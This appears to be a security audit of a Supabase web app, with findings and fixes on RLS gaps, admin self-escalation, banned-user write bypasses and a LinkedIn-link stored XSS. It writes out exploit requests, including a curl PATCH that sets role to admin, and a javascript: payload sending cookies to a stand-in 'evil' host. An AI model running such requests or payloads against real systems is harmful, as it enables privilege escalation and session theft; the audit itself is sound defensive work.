# IFN — Security Audit

**Date:** 2026-06-20  ·  **Branch:** feat/login-register-captcha  ·  **Method:** 7-dimension multi-agent audit with adversarial refutation of every critical/high/medium finding.

**Scope:** `db/*.sql` (RLS + SECURITY DEFINER RPCs), `supabase/functions/*` (edge functions), `web/src` (SPA auth, IDOR, XSS), secrets/supply-chain, `selfhost/` + production-host exposure.

> Security model reminder: the SPA talks **directly to PostgREST with the public anon key**, so **RLS + column GRANTs are the only server-side guard** for table access. Client-side checks are UX only.

## Remediation status

| # | Finding | Severity | Status |
|---|---|---|---|
| 1 | `profiles.role` / `member_type` self-escalation to admin | 🔴 Critical | **Fix written, NOT applied** → `db/security_hardening.sql` (revoke + WITH CHECK). Confirmed live: `has_column_privilege('authenticated','profiles.role','UPDATE')` returned **true** on the running DB. |
| 2 | Banned/restricted users can still insert/update posts | 🟠 High | **Fix written, NOT applied** → `db/security_hardening.sql` (adds `can_write()` to posts insert/update policies). |
| 3 | `idea_autopsies` moderation = unguarded client writes | 🟠 High | **Manual** — table is dashboard-only (absent from repo *and* self-host DB); recommended RLS is in `db/security_hardening.sql` (commented). Verify policies in the **cloud** Supabase dashboard. |

> **Nothing was applied to any database.** `db/security_hardening.sql` (idempotent, runs last via `selfhost/apply-schema.sh`) and the audit below are review artifacts. Apply with `psql "$DATABASE_URL" -f db/security_hardening.sql` after review. The two highs (4–6 below) and `team_posts`/`problems` UPDATE policies share the same `can_write` consistency gap — see findings.

## Summary

23 raw findings → **17 stand after adversarial verification** (6 refuted/withdrawn, see appendix).

| Severity | Count |
|---|---|
| 🔴 Critical | 2 |
| 🟠 High | 2 |
| 🟡 Medium | 2 |
| 🔵 Low | 8 |
| ⚪ Info | 3 |

### Fix-first (Critical + High)

| # | Severity | Finding | Location |
|---|---|---|---|
| 1 | 🔴 critical | Full privilege escalation: any authenticated user can set their own profiles.role = 'admin' | `db/profiles.sql:35,45-46 (+ db/readonly.sql:36-38)` |
| 2 | 🔴 critical | profiles: role / member_type not revoked from authenticated UPDATE in tracked schema — potential self-escalation to admin via direct profile update | `web/src/pages/Settings.jsx:63 (saveColumn); db/profiles.sql:45-46` |
| 3 | 🟠 high | Banned and read-only (restricted) users can still create posts via direct PostgREST insert | `db/posts.sql:43-46` |
| 4 | 🟠 high | idea_autopsies: moderation (approve/reject/delete) performed as direct client table writes with no RLS defined anywhere in the repo | `web/src/pages/AdminPanel.jsx:171 (also :189, :207); web/src/pages/AutopsyLibrary.jsx:73,103` |

---

## Findings

### 1. 🔴 [CRITICAL] Full privilege escalation: any authenticated user can set their own profiles.role = 'admin'

- **Dimension:** RLS & privilege escalation
- **Location:** `db/profiles.sql:35,45-46 (+ db/readonly.sql:36-38)`
- **Confidence:** high

**Evidence**

```
profiles.sql:35  `grant all on table public.profiles to anon, authenticated, service_role;`  — grants column-level UPDATE on ALL columns including `role`. The only column REVOKEs anywhere (grep of every db/*.sql) are: banned (admin.sql:26), restricted/restricted_reason (readonly.sql:10), directory_pinned (directory.sql:16). `role` and `member_type` are NEVER revoked. The live UPDATE policy (readonly.sql:36-38) is: `create policy "update own profile" on public.profiles for update to authenticated using (auth.uid() = id and public.can_write(auth.uid()));` — no WITH CHECK, no column list. No BEFORE UPDATE trigger on profiles exists (only AFTER INSERT triggers on auth.users).
```

**Impact** — Any logged-in member can run, directly against PostgREST with the public anon key, `UPDATE profiles SET role='admin' WHERE id=auth.uid()` and become a Super Admin. is_admin() reads exactly profiles.role, so this immediately unlocks every admin RPC: ban/unban any user, delete any post/problem/idea, set/clear restrictions, move pipeline gates, read the full member directory + registration requests, create polls, lock the feed, etc. Complete compromise of the app's authorization model. (The file header at profiles.sql:32-34 claims privilege columns are revoked 'in the later files' — for role/member_type that revoke was never written.)

**Exploit** — An authenticated, non-banned member (the default state after a normal @ifheindia.org signup) obtains their session JWT from the SPA (visible in browser localStorage / the supabase client) and the project's public anon key (shipped in the frontend bundle). They send a single PostgREST request directly, bypassing the UI:

  PATCH https://<project>.supabase.co/rest/v1/profiles?id=eq.<their-uid>
  apikey: <public-anon-key>
  Authorization: Bearer <their-user-jwt>
  Content-Type: application/json
  Prefer: return=representation
  {"role": "admin"}

RLS allows it (auth.uid() = id, can_write() true), the role CHECK permits 'admin', no WITH CHECK/trigger blocks the new value, and column UPDATE on `role` was never revoked. The row now reads role='admin'. On the next request is_admin() returns true, so the attacker can call every admin RPC: admin_ban_user/admin_unban_user, admin_delete_post/problem/idea, admin_restrict_user, admin_set_feed_locked, admin_set_comments_locked, pipeline gate moves, read admin_members + registration requests, admin_create_invites, etc. Equivalent curl: `curl -X PATCH "$URL/rest/v1/profiles?id=eq.$UID" -H "apikey: $ANON" -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '{"role":"admin"}'`. Complete compromise of the authorization model. Fix: add `revoke update (role, member_type) on public.profiles from authenticated;` (and ideally a BEFORE UPDATE trigger or WITH CHECK that rejects role changes from non-admins).

**Fix** — Add `revoke update (role, member_type) on public.profiles from authenticated;` (role grant assignment already flows through admin_set_role / consume_invite, which are SECURITY DEFINER and bypass the revoke). Also add a `with check (auth.uid() = id and public.can_write(auth.uid()))` to the update policy for defense-in-depth. Verify in the live DB with `\dp public.profiles` that authenticated has no UPDATE on the role column.

<details><summary>Verifier reasoning</summary>

I attempted to refute this and could not find any compensating control. The exploit chain is fully open:

1. GRANT: db/profiles.sql:35 `grant all on table public.profiles to anon, authenticated, service_role;` gives `authenticated` column-level UPDATE on EVERY column, including `role`.

2. REVOKEs: A full grep of db/*.sql (`grep -rni revoke db/`) shows the ONLY column-level REVOKEs from `authenticated` on public.profiles are: `banned` (admin.sql:26), `restricted, restricted_reason` (readonly.sql:10), `directory_pinned` (directory.sql:16). There is NO `revoke update (role)` and NO `revoke update (member_type)` anywhere. The file header at profiles.sql:32-34 and db/README.md:64,80 both CLAIM role is revoked "in the later files" — but that SQL was never written. This is exactly the gap the finding names.

3. RLS policy (the live one, readonly.sql:36-38): `for update to authenticated using (auth.uid() = id and public.can_write(auth.uid()))`. It has only a USING clause, no WITH CHECK and no column list. Since the attacker updates their own row, `auth.uid() = id` holds for the existing row, and `can_write()` (readonly.sql:13-19) returns true for any member who is not banned and not restricted (it does NOT inspect role). So a normal active member passes the policy.

4. No BEFORE UPDATE trigger on profiles (only the AFTER INSERT `handle_new_user` / signup triggers exist — confirmed by grep). No CHECK constraint restricting role transitions; the column CHECK `role in ('student','mentor','admin')` actually permits 'admin'.

5. is_admin() (admin.sql:14-19) is `select exists(select 1 from public.profiles where id = auth.uid() and role='admin')` — it reads profiles.role directly, so flipping the column instantly grants Super Admin and unlocks every is_admin()-gated RPC.

The selfhost stack does not change this: selfhost/volumes/db/ contains only Supabase platform bootstrap (jwt/roles/realtime/webhooks), not the app schema; the same db/*.sql files apply to both cloud and self-host.

No RLS WITH CHECK, no trigger, no column revoke, no server-side validation guards the role column. The finding is real.

</details>

---

### 2. 🔴 [CRITICAL] profiles: role / member_type not revoked from authenticated UPDATE in tracked schema — potential self-escalation to admin via direct profile update

- **Dimension:** IDOR & client-side writes
- **Location:** `web/src/pages/Settings.jsx:63 (saveColumn); db/profiles.sql:45-46`
- **Confidence:** medium

**Evidence**

```
RLS: `create policy "update own profile" on public.profiles for update to authenticated using (auth.uid() = id)` (db/profiles.sql:45-46). Settings exposes a generic writer: `async function saveColumn(key, column, value){ supabase.from('profiles').update({ [column]: value }).eq('id', userId) }` (Settings.jsx:62-63). Grep for column revokes shows ONLY: directory_pinned (directory.sql:16), banned (admin.sql:26), restricted/restricted_reason (readonly.sql:10). There is NO `revoke update (role)` or `revoke update (member_type)` anywhere in db/ or selfhost/. db/README.md:64 and db/profiles.sql:33 *claim* role is revoked, but the DDL statement is absent from the tracked SQL.
```

**Impact** — A member can call `supabase.from('profiles').update({ role: 'admin' }).eq('id', <own uid>)` directly against PostgREST with the anon key. The row is their own so the RLS USING(auth.uid()=id) passes; with no column-level REVOKE on `role`, the write succeeds and is_admin() (which reads profiles.role) then returns true — granting full admin (ban users, change roles, moderate, read all data, approve registrations). member_type is similarly settable. This is privilege escalation to admin from any authenticated account.

**Exploit** — Any authenticated member (non-banned, non-restricted) escalates to full admin: 1) Log in normally to obtain a valid user JWT. 2) Read the project's public anon URL + anon key from the shipped web bundle (web/src/lib/supabase.js / build output). 3) Send a direct PostgREST request: `PATCH https://<project>/rest/v1/profiles?id=eq.<own-uid>` with headers `apikey: <anon>`, `Authorization: Bearer <own-user-jwt>`, body `{"role":"admin"}` (equivalently `supabase.from('profiles').update({ role: 'admin' }).eq('id', myUid)`). RLS USING(auth.uid()=id AND can_write(auth.uid())) passes because the row is theirs and they are not banned/restricted; no WITH CHECK and no column REVOKE blocks the `role` write; the CHECK allows 'admin'. The UPDATE commits. 4) is_admin() now returns true for this user. They can immediately invoke every admin-guarded SECURITY DEFINER RPC (admin_ban_user, admin_set_role on others, admin_update_profile, admin_restrict_user, registration approval RPCs, admin_get_profile to read every member's phone/email/PII, feed/comment moderation). Full tenant compromise. The same one-liner with `{"member_type":"<anything>"}` also succeeds, letting a member forge their displayed membership tier.

**Fix** — Add to db/profiles.sql (and selfhost volumes): `revoke update (role, member_type) on public.profiles from authenticated;` so role is only ever set by the SECURITY DEFINER triggers/admin_set_role RPC. Then verify in the live DB with information_schema.role_column_grants that authenticated has no UPDATE on role/member_type. If already applied out-of-band, commit it so it is reproducible and cannot regress on the self-host rebuild.

<details><summary>Verifier reasoning</summary>

I attempted to refute this and could not — no compensating control exists. Verified facts: (1) db/profiles.sql:18 issues `grant all on table public.profiles to anon, authenticated, service_role`, which includes UPDATE on every column including `role`. (2) The final update policy that actually applies is in db/readonly.sql:36-38: `create policy "update own profile" on public.profiles for update to authenticated using (auth.uid() = id and public.can_write(auth.uid()))`. It has NO `with check` clause and NO column restriction; can_write() only returns false for banned/restricted users, so an ordinary member passes. (3) A full grep for `revoke` across db/ and selfhost/ returns column revokes ONLY for: restricted/restricted_reason (readonly.sql:10), directory_pinned (directory.sql:16), banned (admin.sql:26), and posts/notifications/problems columns. There is NO `revoke update (role)` and NO `revoke update (member_type)` anywhere. (4) No BEFORE INSERT/UPDATE trigger on public.profiles guards role; the only role-change guard (admin.sql:145-146: `cannot change your own role`) lives INSIDE the SECURITY DEFINER RPC admin_set_role and is irrelevant to a direct PostgREST table write. (5) is_admin() (admin.sql:14-20) is literally `select exists(select 1 from public.profiles where id = auth.uid() and role = 'admin')` — so persisting role='admin' on one's own row immediately makes is_admin() true, unlocking every admin RPC. (6) The CHECK constraint `role in ('student','mentor','admin')` explicitly permits 'admin'. (7) member_type has the same gap — never revoked. The db/README.md:64 and db/profiles.sql:33 comments CLAIM role is revoked, but the DDL is genuinely absent from the tracked SQL, exactly as the auditor states. The client surface exists too: web/src/pages/Settings.jsx:62-63 `saveColumn(key, column, value)` does `supabase.from('profiles').update({ [column]: value }).eq('id', userId)`, but an attacker does not even need the UI — they hold the public anon key and can call PostgREST directly. The self-host stack is identical: selfhost applies these same db/*.sql files (REBUILD-GUIDE.md:122-128), so the gap ships to production. This is direct vertical privilege escalation to admin from any authenticated, non-restricted account.

</details>

---

### 3. 🟠 [HIGH] Banned and read-only (restricted) users can still create posts via direct PostgREST insert

- **Dimension:** RLS & privilege escalation
- **Location:** `db/posts.sql:43-46`
- **Confidence:** high

**Evidence**

```
posts.sql:44-46  `create policy "posts insert own" on public.posts for insert to authenticated with check (author_id = auth.uid());` — no `public.can_write(auth.uid())` clause. The client creates posts via a direct table insert: web/src/components/CreatePostModal.jsx:32 `supabase.from('posts').insert(...)` (confirmed), NOT through the create_post() RPC (which does call write_guard). readonly.sql:34-35 explicitly assumes the only direct-client writes are 'profile self-edits and voting' and patches only those two — the direct posts insert path was missed.
```

**Impact** — A user the admins have banned (profiles.banned=true) or set read-only (restricted=true) can bypass the moderation soft-block entirely and keep publishing feed posts by inserting rows directly: `supabase.from('posts').insert({author_id: <self>, kind:'post', title:..., problem:...})`. The whole point of the read-only tier (stay logged in, all writes blocked server-side) is defeated for the feed. Banned users should have no write ability at all.

**Exploit** — An admin bans a user (profiles.banned=true) or sets them read-only (profiles.restricted=true). The user's GoTrue session/JWT remains valid (read-only tier keeps them logged in by design; even a banned user holding an unexpired access token works until it expires). Using that token and the public anon key, the attacker issues a direct PostgREST call, bypassing the app's create_post RPC: POST https://<project>.supabase.co/rest/v1/posts with headers `apikey: <ANON_KEY>`, `Authorization: Bearer <their_access_token>`, body `{"author_id":"<their own uid>","kind":"post","title":"still here","problem":"posted while banned","status":"published"}`. The `posts insert own` policy passes because author_id = auth.uid(), and with no can_write() check and no trigger, the row is inserted and appears published in the feed. The same technique works against PATCH /posts (edit own) and DELETE /posts (delete own), and against /team_posts, fully defeating the read-only/banned moderation tier for those surfaces.

**Fix** — Add `and public.can_write(author_id)` to the `posts insert own` WITH CHECK (matching the pattern already used on problems.sql:73-76, team_posts/teamboard.sql:44-47, and comments.sql:30-33). Apply the same audit to posts UPDATE/publish: update_post() and publish_post() in tags.sql do NOT call write_guard(), so a restricted user can still edit/publish their own posts.

<details><summary>Verifier reasoning</summary>

I tried to refute this but found no compensating control. The `posts insert own` RLS policy (db/posts.sql:44-46) gates only `with check (author_id = auth.uid())` and never calls `public.can_write(auth.uid())`. I confirmed: (1) `authenticated` keeps table-level INSERT on public.posts — only the pinned/badges/success_request columns are revoked (db/posts.sql:59), so a direct PostgREST insert reaches the policy; (2) there is NO BEFORE/AFTER INSERT trigger on public.posts anywhere in db/*.sql; (3) readonly.sql deliberately patched can_write() into only two direct-client write surfaces — the profile self-edit policy (line 38) and post_votes insert/update (lines 42,45) — and its own comment at lines 34-35 admits it only covers "profile self-edits and voting", missing the posts path; (4) can_write/write_guard otherwise lives exclusively inside the create_post/update_post RPCs (tags.sql:71, write_guard at perform sites), which a banned/restricted attacker simply does not call. The project's stated security model is that the client uses the public anon key against PostgREST directly, so RLS is the ONLY server-side guard — which means the guarded RPC offers zero protection against a hand-crafted insert. Two factual errors in the finding's evidence do NOT save it: CreatePostModal.jsx:32 is actually a SELECT inside fetchDrafts(), and the modal in fact routes creation through the guarded create_post RPC (line 142), not a direct .insert(). But the UI is irrelevant to this class of bug — the auditor's core claim (the RLS policy is missing the can_write gate, and a direct insert bypasses moderation) is accurate. The same gap also extends to posts update/delete (db/posts.sql:50,54) and to team_posts insert/update/delete (db/teamboard.sql:43-52), none of which carry can_write either, so banned/restricted users can also edit/delete posts and write to the team board.

</details>

---

### 4. 🟠 [HIGH] idea_autopsies: moderation (approve/reject/delete) performed as direct client table writes with no RLS defined anywhere in the repo

- **Dimension:** IDOR & client-side writes
- **Location:** `web/src/pages/AdminPanel.jsx:171 (also :189, :207); web/src/pages/AutopsyLibrary.jsx:73,103`
- **Confidence:** high  ·  **Verdict:** needs-context

**Evidence**

```
AdminPanel approve: `await supabase.from('idea_autopsies').update({ status: 'approved' }).eq('id', id)` (line 171); reject: `.update({ status: 'rejected', rejection_reason: reason }).eq('id', item.id)` (189); delete: `.delete().eq('id', id)` (207). AutopsyLibrary insert sets `status: 'pending'` and `user_id` from client (73-87) and deletes by id only `.delete().eq('id', autopsy.id)` (103). Repo-wide grep for `idea_autopsies` in db/ and selfhost/ returns ZERO results — no CREATE TABLE, no `enable row level security`, no policy, no admin RPC. Every other moderated table in the app (posts/comments/problems) uses an admin_* SECURITY DEFINER RPC for status changes; autopsies are the only one mutating a privileged `status` column directly from the client.
```

**Impact** — If RLS on idea_autopsies is missing or merely owner-scoped (the table isn't tracked, so it cannot be reviewed/reproduced), a normal member can replay the AdminPanel call to self-approve their own pending autopsy (`update({status:'approved'}).eq('id', mine)`) and publish to the whole network with no admin review — and approval is an owner-permissible column write, so it bypasses review even under a 'correct' author-scoped policy. If RLS is broadly permissive, any member can approve/reject/delete any user's autopsy (full IDOR over the case-study library) and tamper with rejection_reason. Delete-by-id with no owner predicate in the query means owner scoping depends entirely on the (untracked) RLS USING clause.

**Exploit** — Prerequisite: any approved/authenticated member with the public anon key (shipped in the SPA bundle) and a valid GoTrue session.

Self-approval (works even under a correct author-scoped RLS policy, because `status` is an owner-writable column):
1. Member submits an autopsy via the normal UI; row is created with status='pending' and user_id = their own id (AutopsyLibrary.jsx:73-87).
2. Member opens devtools / a REST client and replays the AdminPanel call against PostgREST directly:
   supabase.from('idea_autopsies').update({ status: 'approved' }).eq('id', '<their-own-autopsy-id>')
   (or a raw PATCH to /rest/v1/idea_autopsies?id=eq.<id> with apikey + Bearer token, body {"status":"approved"}).
3. The row flips to approved with no admin review; AutopsyLibrary.fetchAutopsies() (filter .eq('status','approved'), line 50) now serves it to the entire network. Moderation gate bypassed.

Full IDOR (if RLS is disabled/broadly permissive on the table):
1. Member enumerates autopsy ids from the public approved feed (select '*' returns all columns, line 49).
2. Replays update/delete against arbitrary ids:
   - .update({status:'rejected', rejection_reason:'...'}).eq('id', victimId)  -> censor/tamper any author's case study and forge rejection reasons
   - .delete().eq('id', victimId)  -> permanently destroy any member's autopsy (no owner predicate exists in the client query, AdminPanel.jsx:207 / AutopsyLibrary.jsx:103, so owner scoping depends entirely on the untracked RLS USING clause).

Remediation: add db/autopsy.sql with `alter table idea_autopsies enable row level security` (default-deny), an author-scoped INSERT/SELECT/own-delete policy that does NOT allow the author to set/change `status`, and an `admin_*` SECURITY DEFINER RPC (approve/reject/delete) self-authorizing via is_admin(), mirroring the existing posts/problems/teamboard pattern; then repoint AdminPanel.jsx to those RPCs.

**Fix** — Add a tracked db/autopsies.sql: enable RLS; SELECT approved-or-own; INSERT with check(user_id = auth.uid() AND status = 'pending'); REVOKE UPDATE(status, rejection_reason, user_id, created_at) from authenticated; do approve/reject/delete via SECURITY DEFINER admin RPCs gated by is_admin() (mirror admin_delete_post). Make the client call those RPCs instead of `.from('idea_autopsies').update/delete`.

<details><summary>Verifier reasoning</summary>

I could not find any compensating control in the repo. Exhaustive grep for `idea_autopsies` across db/, selfhost/, supabase/, and all *.sql/*.ts/*.js/*.jsx files returns ZERO backend hits — only the five client-side call sites in web/src/pages/AdminPanel.jsx (lines 104, 171, 189, 207) and web/src/pages/AutopsyLibrary.jsx (lines 48, 73, 103). There is no CREATE TABLE, no `enable row level security`, no `create policy ... using/with check`, no BEFORE trigger, no `revoke`/column GRANT, and no `admin_*` SECURITY DEFINER RPC for autopsies anywhere. This is confirmed against the pattern of every OTHER moderated table: posts (db/tags.sql publish_post), problems (db/problemhub.sql), teamboard (db/teamboard.sql admin_delete_team_post), calendar, and the pipeline — all route privileged/status mutations through SECURITY DEFINER RPCs granted to `authenticated`, and db/README.md documents them as "All default-deny; RPCs: ...". The autopsy `status` column is the ONLY privileged moderation column in the app written directly from the client.

The reference docs (reference/IFN Backend — Data Model.md) only describe a legacy `autopsy` jsonb field on posts, NOT the standalone `idea_autopsies` table the SPA now hits — so the table is genuinely untracked.

I cannot REFUTE the finding because no control exists to cite. The architecture the auditor described is correct: the SPA talks to PostgREST with the PUBLIC anon key, so RLS + column grants are the only server-side guard. The AdminPanel `isAdmin`/`<Navigate>` gate (AdminPanel.jsx:24,116) is client-side cosmetic only — it does not constrain a hand-crafted PostgREST request.

The reason this is `needs-context` rather than `confirmed`: the actual exploitability depends on the LIVE database's RLS state for `idea_autopsies`, which is not in the repo and cannot be reproduced from source. Two cases, both bad: (a) if RLS is disabled or grants are broad, any authenticated member can approve/reject/delete ANY autopsy (full IDOR over the library, plus rejection_reason tampering); (b) even under a "correct" author-scoped USING policy, `status` is a column the owner can write, so a member can self-approve their own pending submission and publish network-wide with no admin review (the review gate is bypassed). The only configuration that is safe is one that does not exist in source and would have to be confirmed by introspecting the production DB. Given the documented security model and the fact that this is the sole moderated table lacking the established RPC pattern, the safe assumption is exploitable.

</details>

---

### 5. 🟡 [MEDIUM] Banned/restricted users can still vote on problems (problem_votes insert/update unguarded)

- **Dimension:** RLS & privilege escalation
- **Location:** `db/problem_votes_v2.sql:20-24`
- **Confidence:** high

**Evidence**

```
problem_votes_v2.sql:20-24  `create policy "upsert own vote" ... for insert ... with check (user_id = auth.uid());` and `create policy "update own vote" ... for update ... using (user_id = auth.uid());` — neither includes `public.can_write(auth.uid())`. Contrast post_votes, which readonly.sql:40-45 deliberately re-creates WITH the can_write() guard. The Problem Hub votes table (added later, in problem_votes_v2.sql) was not given the same treatment.
```

**Impact** — A read-only (restricted) or banned member can still cast and change up/down votes on Problem Hub problems via direct PostgREST insert/update, manipulating the score ranking despite being write-blocked. Lower impact than RLS-2 (votes, not content), but it is the same class of read-only-bypass and inconsistent with the post_votes hardening.

**Exploit** — Attacker is a member who has been set to restricted (read-only) or banned by an admin via admin_restrict_user / ban. Their session/JWT remains valid (restriction is a soft block; they stay logged in). Using the public anon key and their own JWT, they issue a direct PostgREST request, e.g. `POST /rest/v1/problem_votes` with body `{"problem_id":"<uuid>","user_id":"<their own uid>","value":1}` on conflict do update (the exact call the app makes: supabase.from('problem_votes').upsert({...})). The insert policy only checks `user_id = auth.uid()`, which passes, and the row is written. They can flip value between 1 and -1 via the unguarded update policy to repeatedly manipulate a problem's score (coalesce(sum(pv.value)) in problem_feed/problem_detail) and thus the Problem Hub ranking, despite being write-blocked everywhere else. No admin action, no content access beyond their own vote row is needed.

**Fix** — Recreate the problem_votes insert and update policies with `and public.can_write(auth.uid())` in the WITH CHECK, mirroring readonly.sql's post_votes policies.

<details><summary>Verifier reasoning</summary>

No compensating control exists. I searched the entire repo for any guard on public.problem_votes: it is referenced ONLY in db/problem_votes_v2.sql (the table + its 4 RLS policies) and in the read-side problem_feed/problem_detail definer functions. There is no later file, no BEFORE trigger, no column GRANT revoke, and no re-created policy anywhere that adds public.can_write(auth.uid()).

The two write policies are exactly as cited:
- db/problem_votes_v2.sql:20-21 — `create policy "upsert own vote" ... for insert ... with check (user_id = auth.uid());`
- db/problem_votes_v2.sql:23-24 — `create policy "update own vote" ... for update ... using (user_id = auth.uid());` (no WITH CHECK at all, no can_write).

Contrast with the established hardening: readonly.sql:40-45 re-creates post_votes insert/update WITH `public.can_write(auth.uid())`, and db/problemhub.sql guards every other Problem Hub write — problems insert (line 75 `and public.can_write(auth.uid())`), and problem_solve()/review via `perform public.write_guard()` (lines 161, 190). So the guard is the deliberate, consistent pattern for this feature; problem_votes was simply missed.

Apply order confirms the gap is live, not overwritten: selfhost/apply-schema.sh runs `readonly` early and `problem_votes_v2` last, so problem_votes_v2.sql's unguarded policies are the final state. The client writes go straight to PostgREST — web/src/pages/ProblemHub.jsx:54-56 and web/src/pages/ProblemDetail.jsx:104-106 call `supabase.from('problem_votes').upsert(...)` / `.delete(...)` with the public anon key — so RLS is the only server-side guard, and it does not check banned/restricted on insert/update.

can_write() (readonly.sql) returns `not banned and not restricted`, so a banned OR restricted user passes the `user_id = auth.uid()` check and the write succeeds.

Severity medium is correct: this is a read-only/banned-bypass, but limited to vote manipulation (score ranking) rather than content creation — same class as the post_votes hardening it is inconsistent with, lower impact than content-write bypasses.

</details>

---

### 6. 🟡 [MEDIUM] Unvalidated profiles.linkedin rendered as href enables javascript:/data: URL XSS (client-only scheme validation, no DB constraint)

- **Dimension:** XSS & untrusted content
- **Location:** `web/src/pages/Profile.jsx:122 (also UserProfile.jsx:99, Directory.jsx:154, TeamAcquisition.jsx:509)`
- **Confidence:** high  ·  _(severity adjusted high → medium on verification)_

**Evidence**

```
Render sink (no scheme check): `<a href={profile.linkedin} target="_blank" rel="noreferrer" className="btn-outline mt-4 w-full">Connect on LinkedIn</a>`  — Only guard is client-side regex on write: Profile.jsx:68 `if (linkedin && !/^https?:\/\/\S+$/i.test(linkedin)) return setError(...)` and Onboarding.jsx:47 identical. The DB column has NO constraint: db/profiles.sql:23 `linkedin text,` and db/directory.sql:28 `... linkedin text, ...` (plain text, no CHECK). team_applicants exposes the same field (db/teamboard.sql:135 `applicant_startup text, applicant_linkedin text`) sourced from the applicant's profiles.linkedin, rendered at TeamAcquisition.jsx:509.
```

**Impact** — Per the documented threat model, the SPA talks directly to PostgREST with the PUBLIC anon key, so the React form's regex is not a server-side control — a member can bypass the form and PATCH their own profiles.linkedin row to `javascript:fetch('//evil/?c='+document.cookie)` (or a data: URL) via a direct PostgREST request (RLS permits updating one's own profile). Any member viewing that profile in Directory/UserProfile, or any post/team-board author/admin viewing the attacker as an applicant in Team Acquisition, who clicks the 'LinkedIn'/'View LinkedIn' button executes attacker JS in their authenticated session (session token / actions on the victim's behalf). This is stored XSS in a members-only app, including against admins via the applicant view. React's text escaping does NOT cover href scheme — only the value is escaped, the `javascript:` scheme still fires on navigation.

**Exploit** — Attacker = any approved member. 1) Obtain anon key + own JWT from the SPA (both client-side). 2) Bypass the React form with a direct PostgREST write: `PATCH https://<proj>.supabase.co/rest/v1/profiles?id=eq.<own-uuid>` with `apikey: <anon>`, `Authorization: Bearer <own-jwt>`, body `{"linkedin":"javascript:fetch('https://evil.tld/c?d='+encodeURIComponent(document.cookie))"}`. RLS (auth.uid()=id and can_write) accepts it; no CHECK/trigger/column-revoke stops the scheme. 3) The value now flows unescaped into Directory (any member), UserProfile, the attacker's own Profile, and — via team_applicants — to any team-post author or admin who opens the applicant list (TeamAcquisition.jsx:509). 4) A victim clicking 'LinkedIn'/'View LinkedIn'/'Connect on LinkedIn' triggers the javascript: URI in their authenticated session. On the self-hosted IIS deployment (no CSP), this executes attacker JS — session/token theft, actions on the victim's behalf, including against an admin reviewing the attacker as an applicant. On current Vercel prod, the `script-src 'self'` CSP blocks the javascript: execution, but the attacker can still store any arbitrary `https://attacker.tld` URL (regex allows it) and weaponize the `target=_blank` LinkedIn button for credential-phishing/open-redirect against members and admins.

**Fix** — Do not rely on the form regex. (1) Add a Postgres CHECK constraint / trigger on profiles.linkedin (and any other URL columns) rejecting anything not matching `^https?://`, so direct PostgREST writes are rejected. (2) Defense-in-depth at the sink: introduce a `safeHref(url)` helper that returns the url only if `new URL(url).protocol` is `http:`/`https:` (else `undefined`/`#`), and use it in all four anchors. This neutralizes javascript:, data:, vbscript:, blob: schemes regardless of how the value entered the DB.

<details><summary>Verifier reasoning</summary>

The write-side and render-side mechanics in the finding are accurate and I found NO server-side scheme validation: db/profiles.sql:23 is plain `linkedin text` (no CHECK); the final RLS update policy in db/readonly.sql:36-38 is `for update to authenticated using (auth.uid() = id and can_write(auth.uid()))` — a normal member may PATCH their own row; the only `revoke update` (readonly.sql:10) covers `restricted, restricted_reason`, NOT `linkedin`, so `authenticated` keeps the column UPDATE grant and a direct PostgREST `PATCH /profiles?id=eq.<self>` with a `javascript:`/`data:` value succeeds. The SECURITY DEFINER RPCs only `nullif(trim(...))` (admin.sql:98, member_type.sql:93) and pass the raw value through: `directory()` (member_type.sql) returns `p.linkedin` to ANY authed member, and `team_applicants()` (teamboard.sql:141) returns `p.linkedin` to the post author OR an admin (is_admin()). All four sinks render it raw: Profile.jsx:122, UserProfile.jsx:99, Directory.jsx:154, TeamAcquisition.jsx:509 — React escapes the value but not the URL scheme. The grep for CHECK/trigger/sanitizer/dangerouslySetInnerHTML over db/, supabase/, selfhost/, web/ found nothing. So the only compensating control is the PRODUCTION CSP at web/vercel.json:10: `script-src 'self'` (no 'unsafe-inline') blocks `javascript:` URI navigation in compliant browsers, and `connect-src 'self' https://*.supabase.co` blocks exfil to `//evil/`. That neutralizes the documented payload on the current Vercel prod. BUT: (1) the CSP is a Vercel-emitted HTTP header with zero equivalent in the active self-host migration — selfhost/ has no web.config and none of the nginx/caddy/envoy compose files set Content-Security-Policy — so the moment the SPA is served from the Windows/IIS box (the stated direction of this branch/repo), the only guard vanishes; and (2) even under prod CSP, the regex permits any `https?://` URL, so phishing/open-redirect (`target=_blank`) abuse is unaffected. Real stored-XSS vector with a missing server-side control; currently mitigated only by a platform-specific header that the project is in the process of leaving behind. Severity reduced from high to medium because the production deployment's CSP blocks execution and exfil today.

</details>

---

### 7. 🔵 [LOW] send-invites and send-contact embed Resend API errors (incl. full response body) into the JSON returned to the caller

- **Dimension:** Edge functions authz
- **Location:** `/home/basil/lumenor/ifn/supabase/functions/send-invites/index.ts:118`
- **Confidence:** medium

**Evidence**

```
else failed.push({ email: inv.email, reason: `Resend ${res.status}: ${await res.text()}` })   // and send-contact:82  return json({ error: `Delivery failed: ${String(e)}` }, 502)
```

**Impact** — The raw Resend HTTP error body is surfaced to the (admin-only for send-invites) caller. Not a secret leak — the Resend API key is never echoed, only the provider's error JSON — but it can leak provider-side details (domain config, recipient validation reasons) into the client. For send-invites the caller is already an admin, so impact is minimal; for send-contact the caller is any authenticated member and a 502 reveals provider internals.

**Fix** — Return a generic 'Could not send the message' to the client and keep the detailed Resend response in console.error only.

---

### 8. 🔵 [LOW] register-request rate limit is per-IP only and bypassable when x-forwarded-for is absent/spoofed

- **Dimension:** Edge functions authz
- **Location:** `/home/basil/lumenor/ifn/supabase/functions/register-request/index.ts:101`
- **Confidence:** medium

**Evidence**

```
const ip = (req.headers.get('x-forwarded-for') || '').split(',')[0].trim() || null
  if (ip) { ... if ((count ?? 0) >= RATE_LIMIT_PER_HOUR) return json(...429) }
```

**Impact** — If x-forwarded-for is missing, ip is null and the per-IP rate-limit block is skipped entirely (the `if (ip)` guard). An attacker who can suppress or rotate the forwarded-for value can exceed 5 req/hr, driving certificate uploads to the private bucket, registration_requests inserts, admin notifications, and acknowledgement emails (Resend cost / mailbombing of attacker-chosen applicant addresses). Honeypot + captcha (when TURNSTILE_SECRET is set) are the real backstops; in production captcha is currently OFF per project memory, so only the honeypot guards this path. email_exists + pending-dedup limit per-email repeats but not per-attacker volume across distinct emails.

